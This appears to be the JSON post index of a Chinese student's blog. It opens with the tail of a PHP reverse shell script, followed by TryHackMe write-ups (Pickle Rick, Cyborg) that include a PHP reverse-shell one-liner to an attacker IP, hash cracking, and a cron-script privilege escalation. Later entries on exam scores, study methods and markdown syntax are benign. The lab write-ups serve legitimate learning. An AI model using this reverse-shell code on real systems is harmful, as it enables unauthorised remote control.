=&gt; array(&quot;pipe&quot;, &quot;r&quot;), // stdin is a pipe that the child will read from 1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;), // stdout is a pipe that the child will write to 2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;) // stderr is a pipe that the child will write to);$process = proc_open($shell, $descriptorspec, $pipes);if (!is_resource($process)) &#123; printit(&quot;ERROR: Can&#x27;t spawn shell&quot;); exit(1);&#125;// Set everything to non-blocking// Reason: Occsionally reads will block, even though stream_select tells us they won&#x27;tstream_set_blocking($pipes[0], 0);stream_set_blocking($pipes[1], 0);stream_set_blocking($pipes[2], 0);stream_set_blocking($sock, 0);printit(&quot;Successfully opened reverse shell to $ip:$port&quot;);while (1) &#123; // Check for end of TCP connection if (feof($sock)) &#123; printit(&quot;ERROR: Shell connection terminated&quot;); break; &#125; // Check for end of STDOUT if (feof($pipes[1])) &#123; printit(&quot;ERROR: Shell process terminated&quot;); break; &#125; // Wait until a command is end down $sock, or some // command output is available on STDOUT or STDERR $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); // If we can read from the TCP socket, send // data to process&#x27;s STDIN if (in_array($sock, $read_a)) &#123; if ($debug) printit(&quot;SOCK READ&quot;); $input = fread($sock, $chunk_size); if ($debug) printit(&quot;SOCK: $input&quot;); fwrite($pipes[0], $input); &#125; // If we can read from the process&#x27;s STDOUT // send data down tcp connection if (in_array($pipes[1], $read_a)) &#123; if ($debug) printit(&quot;STDOUT READ&quot;); $input = fread($pipes[1], $chunk_size); if ($debug) printit(&quot;STDOUT: $input&quot;); fwrite($sock, $input); &#125; // If we can read from the process&#x27;s STDERR // send data down tcp connection if (in_array($pipes[2], $read_a)) &#123; if ($debug) printit(&quot;STDERR READ&quot;); $input = fread($pipes[2], $chunk_size); if ($debug) printit(&quot;STDERR: $input&quot;); fwrite($sock, $input); &#125;&#125;fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);// Like print, but does nothing if we&#x27;ve daemonised ourself// (I can&#x27;t figure out how to redirect STDOUT like a proper daemon)function printit ($string) &#123; if (!$daemon) &#123; print &quot;$string\\n&quot;; &#125;&#125;?&gt;"},{"title":"THM 两个简单靶场记录","path":"2024/02/19/thm/","text":"记录下try hack me的学习之路 Pickle Rick flag1 flag2 flag3 Cyborg 信息收集 暴力破解 flag1 flag2 Pickle Rick 需要寻找三部分flag flag1 首先打开题目,什么也没有,按F12看到用户名 然后信息收集: nmap扫描发现只开了两个端口:22,80 dirsearch扫描发现可疑文件 访问robots.txt 看到一串字符串: Wubbalubbadubdub，猜测是密码 访问login.php 使用用户名和密码登录 是一个命令执行窗口，输入ls看看 cat一下第一个txt文件发现被过滤，使用经典的绕过：tac 得到第一个flag：mr. meeseek hair flag2 接着tac其他文件发现并无关键信息 clue.txt 内容：Look around the file system for the other ingredient. defined.php为： 显然，权限不够于是思考反弹shell到攻击机，使用php语言php -r '$sock=fsockopen(&quot;10.8.39.215&quot;,9999);$proc=proc_open(&quot;/bin/sh -i&quot;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);' 反弹成功，并发现可以直接使用sudo su 变成root权限 然后就是随心所欲了，cd /home发现rick，进一步拿到第二个flag: 1 jerry tear flag3 根据直接提权到root猜测最后一个flag在root目录下（让我们一开始不是root的时候访问不了） 拿到最后一个flag：fleeb juice 总结：这个还是很好玩的，体会到一步步寻找的乐趣，而且也非常简单，适合初学者熟悉大致流程。 Cyborg 信息收集 先用nmap扫描开放端口信息，枚举端口上运行的服务 访问80端口是个apache默认页面，用dirb扫描一下网站目录 发现两个比较可疑的目录/admin和/etc 再用dirbuster扫一遍目录，得到一个压缩包archive.tar，我以为是源码之类的，打开发现不是。 现招其它线索，admin.html里有些聊天记录，这里有几个民资Josh、adam、alex 还有一个被描述的很重要的东西叫music_archive 暴力破解 随后在/etc目录下发现了这个东西，看起来像是一串密文，特征还比较明显 打开hashcat的密文类型进行匹配，匹配到1600 $apr1$ https://hashcat.net/wiki/doku.php?id=example_hashes 用hashcat暴力破解 暴力匹配rockyou得到明文，用这个密码ssh试了所有得到的类似用户的账号都没有进去。 再回到之前的tar文件，里面有个README，里面指向一个域名 访问一下，理解大概是一个文件储存仓库的东西 再github上也找到了相关的项目，这里有个安装包，我们下载来看看 运行borg就会出现帮助文档 flag1 根据文档用list 查看目录下的文件，密码用刚刚破解得到的hash，有个music_archive 用extract提取出来，密码一样。得到一个alex的文件 看下alex的目录结构类似于“home”目录 翻了目录得到alex的账号和密码 ssh上去直接拿到第一个flag flag2 使用sudo -l查看具有sudo权限的命令，有个/etc/mp3backups/backup.sh 查看文件所有者是alex，加个可写权限 在文件中加入反弹shell命令 攻击机上起监听，没一会shell 就过来了 登录后crontab -l看下定时任务， 发现backup.sh在定时任务中 成功拿到root flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}"},{"title":"致2023","path":"2023/12/31/2023/","text":"2023年度总结 2023年度总结 回首2023，我做了哪些事 对未来的规划 上半年 下半年 引用一段fushuling大佬的blog里的话 最后，祝各位新年快乐！ 回首2023，我做了哪些事 六月成功利用xray挖到了第一个src重复漏洞 搞了个博客，还不怎么更新 没了 总结，我就是个废物 对未来的规划 2024年，是高二下半年与高三上半年，在2024年9月1日那天，我们就将正式步入高三生活 上半年 先过学考 备考期末，主抓语数地（ 你个傻逼学校不给我整日语卷纸我考你妈啊） 又将是一个三周的寒假，学习，复习，打ctf，挖src 开学后：高二下半年了，请不要过的浑浑噩噩 下半年 全身心的备战2025年的高考 引用一段fushuling大佬的blog里的话 感觉又看到了很多需要去学习的 看别人的简历，大部分人简历中对某个技能的掌握程度都大概分为三种——了解、熟悉和精通，按照这个标准，我也把对某项技能的掌握程度分为了三个程度——入门、熟练和精通，入门也就是大致了解某种技巧的常见利用方法，对原理有着基础的认识，比如sql注入的盲注知道个时间盲注和布尔盲注，知道时间盲注可以用sleep()构造延时来判断自己的语句是否正确执行，这大概就算基本入门了；而做到熟练的话，至少得掌握大部分常见的利用方法，对原理有本质的认识，还是以时间盲注为例，得知道各种限制条件下如何进行时间盲注，比如知道如果注入的时候sleep语句被ban了，明白时间盲注的本质就是要构造延时来判断自己的语句是否成功执行，因此即使sleep被ban了，也可以通过其他方法构造延时，比如可以用benchmark重复执行某个表达式构造延时、通过rpad或repeat构造长字符串加以计算量大的pattern来制造延时、用笛卡尔积连接表进行延时或者简单点只是执行某个非常麻烦的句子，比如把某个字符串hex很多遍然后select它的长度来明显减缓数据库的执行速度构造延迟等等，如果发现关键字被过滤可以想到其他绕过方法比如16进制之类的，发现执行的sql语句知道一些绕简单waf的方法比如分块传输、参数污染等。至于精通，虽然我自己也没达到这个水平，但我自己对这个境界的理解是，要对原理有着深刻的认识，能在前人的基础上做到推陈出新，对一些问题能提出自己独到的见解，提出一些崭新的方法，比如p神提出的那么多全新的技巧。 今年个人认为写的最好的应该是无字母数字RCE和wakeup绕过这俩篇，达到了熟练这个程度，不过从结果上看，还是那篇sql注入总结受欢迎程度高点。就mysql注入而言的话勉强达到了熟练这个程度，但那篇文章既然叫sql注入，还是很多其他数据库的注入没有提到，比如oracle啥的，有点名不副实，奈何我自己也不会，也没法写，而且连现在业界最常见的预编译下的sql注入都没提到，可谓极大的失败，还好后来补了一篇专门研究预编译的文章。wakeup绕过这篇写的确实是比较全，至少我当时写的时候网上大部分文章都没提到我博客里写的那几种技巧，后来看别人博客有时候总会看到别人引用我的博客链接，不经令人感叹。 从中总结,需要学习的有sql注入各语句及sql特性,RCE(我的RCE全解还没写完QAQ),反序列化绕过(记得有一次哪个比赛出的就是wakeup绕过,虽然被非预期了),oracle注入,预编译注入(贴个大佬blog供自己学习) 预编译与sql注入 最后，祝各位新年快乐！"},{"title":"成绩","path":"2023/11/17/考试/","text":"一个专门用来记录考试成绩的帖子（更新于2024年5月20日） 高二上期中 别问英语怎么回事,我学日语的,英语前卷满分110我扣64,大作文25分没写,乐,学nm英语 记录下2025届傻逼在高二上的期中考试考出来的傻逼成绩，我一开始满心欢喜捏，考试过程中答的挺开心，结果数学错一堆，语文也莫名奇妙，鬼作文好像还跑题了，地理大题约等于0分，前面选择错一半（应该没有比我多的了），化学60，物理70（这俩我感觉还行结果怎么才中档，还是傻逼，还得努力），甚至盼望出分 高二上期中考试总成绩381分（大榜449，不算英语385，这次考试确实是我傻逼）：语文72，数学49，英语56，物理55，化学51（78），地理36（70） 以后这个文件就用来更新成绩，从高二上的这个期中考试开始 高二上期末 虽然进步了，但是不是很满意，物理后面大题明明很简单却完全没拿到分（得有23分），化学选择15错8，大题也很少拿分，地理选择16对5，一下就33分没了 高二上期末考试总成绩（大榜361）（不算英语260多）：语文76.5，数学82, 英语85.5, 物理62, 化学43 (69) , 地理38 (74) 高二下期初 大榜360，不算英语229，语文89，数学70，英语63.5，物理60，化学31（52），地理57（77） 高二下期中 语文87，数学110，英语51.5，物理85，化学58（82），地理57（85） 本来估分是数学120，物理90，化学差不点60，化学差不多，物理最后一个大题过程差几步多扣我五分，数学估计也是过程多扣了10分（真该死啊） 大榜321，英语加到跟第五一样的105是大榜144，加到跟lsq一样的120我就大榜70了，而且跟lsq只差数学的30分，搞不好啥时候第一的位置就给我坐坐了 这次考试简单归简单，但是进步也是让我进步完了，一下跨擦差点进步两百名出去，下次考试说是能给我整日语卷纸了，那哥们也是得发力真进步200了，这次321，下次哥们搞不好就121 如何进一步蜕变 之前一直没怎么认真冲分，学的也半斤八两，考前也不复习，所以一直没有一个好的成绩，那么这次在考试前进行了充分的复习，认真的翻阅了物理与化学笔记，最终分数来到了大榜150名的位置，少有失误，而要想从150蜕变进100，就有点难了，因为错的都是不会的，要想进一步冲分，就得把不会的东西都搞会，以这次考试来说，之前对于考后的总结并未有一个良好的总结，因为也不知道要总结什么， 错的都是很基础的东西，这次能够进行一个良好的总结了 语文 很有意思啊，几乎每一个大块扣六分，语言文字运用扣10分,几乎遍地都是neng进步的点，但是一看大榜第10也才刚过百内心也就淡然了 数学 大榜五个满分，可以接受，自己110，不能接受，预估是120的,单增是闭区间丢了五分，多选少选一个，填空一个零点题没会做，大题是等差乘等比求前n项和忘了，最后的大题证明极值点偏移错了 物理 物理85分，全部扣分点在实验题审题不清，太大意了以为是默认情况，直接没仔细看，大题没观察到1m之后上面有个挡，得压缩弹簧，一下丢7分，还有最后一个弹簧之前就是被压缩状态没考虑，总共扣15分 化学 化学58，选择题蒙对了很多，就依次说吧，金刚石每个碳原子被12个六元环共用，甲苯与浓溴水混合有机层在上，乙醇互溶，乙烯加成后有机层在下，乙醛发生氧化还原反应后褪色，苯酚生成白色沉淀一些反应的现象不是很熟练，计算之前懒得算，之后得抓抓计算，还是基础，这次考的也不是很难的东西，但就是会错 地理 错六个选择，大题思考的方向不够全面，例如高端产品想到附加值高，而且一些显而易见的东西或者可能不对的东西也要往上写，有好多自己认为不对的点结果是对的（地理还是玄），提到海水西引，我的反应是当作普通的水，作用是畜牧，灌溉，人类活动，种碱水稻，结果不能这样，应该当作海水利用，如海水养殖，海水稻，海水淡化，旅游，就很多东西你明明知道就引过去那么点水干这些肯定不够，但是还是得写，地理就是这样，引海水的缺点我写了一大堆结果总结就是成本远大于经济效益，只有一点，而应该是经济效益低，耐腐蚀管道材料贵，西部有结冰期，海水下渗会导致盐碱化，思考问题的方向还是要发散一些，全面一些 总结 有很多东西吧，你不做以为很简单，做上了发现很难，而且还会引出很多东西，还有的根本就不知道怎么下手，现在最明显的感觉就是时间不够，心思很乱，啥都想搞，啥都搞不了，而且自我放纵过度（就是啥都知道就是不改）就比如哥们现在混着网安，干着开发，惦记着打pcb板做嵌入式，还想高考省7000进南邮，还想冲个线下赛进nu1l,还想挖src拿钱拿证书，太多了，就高中这种早六晚十根本不够用，学校里大部分时间都是浪费掉的，就利用率20%都是顶天，上这个b学真不如不去，但是不去就会错过那20%的内容，错过高考就够呛，然后就属于把main扔了留其他的，难受死了，感觉还有个现在在浪费时间的原因就是东西太杂了不知道从何下手，于是干脆不下手，摆烂（还是那句话，就是啥都知道就是不改） 高二下期末 忘了，好像160吧 一模 444，英语65，按115算加50分494，大榜200多点，班主任说往年600分线就是这次联考700以内，525分正好到了，大榜106，30分，一个物理俩大题就是三十分，一个数学还能凹最少30，二模十月中旬好像，现在补补基础往上学学，哦对，好消息，日语长难阅读在我做到第44个阅读时成功不看答案不看翻译纯做题实现五道全对，然后在下一个阅读错三个之后再下一个又全对了，现在文章能看差不多了，题目里面的坑也能看出来了，基本那种错一个的就是错那个 “而且” “或者” “但是” 这种选择上了，没事多背背单词还是可以对的，这么整，高考真能冲130，前提是作文还得练，下次二模的时候，把物理复习一下，电那部分看看，大题争取全对，然后数学差概统和圆锥曲线，这个复习一下基本分数就上去了，显然，别人也会上去，那就得凹小分了，还有就是化学大题，练练这个也差不多练出来思路了就能做对了"},{"title":"学习方法","path":"2023/10/23/learn/","text":"学习方法摘录 摘自魏书生先生著作《好学生，好学法》并基于本人自身理解进行部分修改,与原著并不完全相同.（感谢闻校借我这本书让我能了解这些） 明确目的: 享受学习,定小目标一步步超越. 激发兴趣: 先学喜欢的科目,满怀兴趣对待学习. 磨练意志: 利用潜意识,坚信自己有巨大潜能,勤奋刻苦,持之以恒. 发展思维,培养注意力: 培养思维的独立性,深刻性,逻辑性,灵活性,使思维敏捷。 培养创造性思维: 入迷 求异 发散 独创 培养注意力: 学会&quot;闹中求静&quot; 培养好的注意力的要点: 明确学习目的,增强责任感 理解事情的结果与意义 培养广泛的兴趣 用意志力保持注意力集中 防止过度疲劳 培养长期注意 明确学习任务,使注意力集中于一件事,缩小学习范围,明确学习目标. 注意力要素=集中+稳定. 要合理转移与分配注意力. 训练记忆力: 一分钟记忆力比赛,重要内容最初或最后记. 链式记忆法: 记一五步,看清,熟读,释义,书写,再现.(记一接记二,记二复习一,记三复习二三,记四复习三四,记五复习四五,然后复习一五,最后全部复习一遍). 分段记忆,重复记忆,走路时利用零散时间记忆. 统筹计划: 指定大计划小计划双休日学习计划,定个高效学习日,最佳时间多安排任务,控制 “三闲” (闲话,闲事,闲思),巧用零散时间,挤时间,别犹豫. 科学预习,专心听课,及时巩固: 要进行预习,玩命自学,筛选信息,循序渐进,打好基础,上课听要点,要有所听有所不听,课后还要进行总结. 认真复习: 制订复习计划,温故知新,定期复习,复习要扬长补短. 高效复习法: 围绕中心,及时复习,生化只是,查缺补漏,先回忆,后查找.增强复习效果,看参考书,适当拓展知识面，整理笔记，使知识条理化系统化,补充提示,综合归纳,梳理知识. 复习应注意的问题: 掌握好复习时机,复习安排要合理,课后复习省于分散,经常复习,以记忆为主的内容应多次重复强化记忆分散复习,阶段性复习应集中时间,个人钻研为主,相互讨论为辅,复习方式要多样化. 四化学习法: 消化,简化,序化,系统化 高三三步复习法: 一:系统复习,抓基础,吃教材。二:查缺补漏,针对薄弱环节抓。三:最后回顾,置通,巩固和运用知识自己测 注意: 与教师辅导相结合,从自身出发. 面临考试,心情紧张,怎样复习效率高: 把教材整个体系印在脑中,先看着知识框架,接着记忆重要项目,要由近及远,先复习后学的知识. 锥形复习法:集中一点,登峰造极 趁热打铁法:经常复习,及时复习 旧路新走:逆思顺读,顺逆交错思考 从容考试: 有效利用考前半个月时间:吃课本,筑基,细啄解题思路,做多套综合性模拟题并总结知识点,分析错题,考前调整心态,考前独来独往好,考前不宜熬夜,考时应放手一搏. 考场闭目养神,冥想,调整呼吸,进行考场放松. 若打不完题应挑空白题答要点,能拿多少是多少,宁可少拿不能不拿,要留出一点复查时间. 考场开拓思路: (1) 相似思考, (2) 相反思考, (3) 对比思考, (4) 溯源思考, (5) 多路思考, (6) 换元思考, (7) 分解思考."},{"title":"Welcome to my blog!!!!!","path":"2023/09/17/welcome/","text":"欢迎访问我的blog,这里会不时更新 欢迎访问我的blog,这里会不时更新 markdown文件指令 markdown文件指令 这是我的第一篇文章,而我并不知道要写什么好,所以我决定将markdown文件的各种指令写下来,方便自己以后查阅. 12345678不同的#数量代表不同的标题等级 Ctrl + Shift + H* 斜体** 加粗*** 加粗和斜体加粗，Ctrl + B ；斜体，Ctrl +I如下所示 斜体 加粗 加粗和斜体 删除线 ~~字符~~ 即可 12345678910111213用反引号``表示命令 Ctrl + Shift + K用 - 管理无序条目，短杠左右需空格，用 1. 管理有序条目，点后需空格，序号依次类推无序，Ctrl + Shift + U；有序，Ctrl + Shift + O引用文本 &gt; 后面直接加文字 Ctrl + Shift + Q超链接: [name](url) Ctrl + Shift + L附图: ![name](url) Ctrl + Shift + G分割线----，用在各一级标题后面，使排版更美观、有层次感利用缩进，可以将不同层级的无序条目要点更美观的展现出来 文本 这样会产生一个任务栏,如图 文本 在其中加入x便会填充上,如图 文本 |||表示表格,例: 表格 表格 表格 实例1 aaa bbb 实例2 ccc ddd 1234| 表格 | 表格 | 表格|| :--- | :---: |---:|| 实例1 | aaa | bbb || 实例2 | ccc | ddd | 还可以在markdown文件中直接输入emoji😄😅😋🤡🤤"}]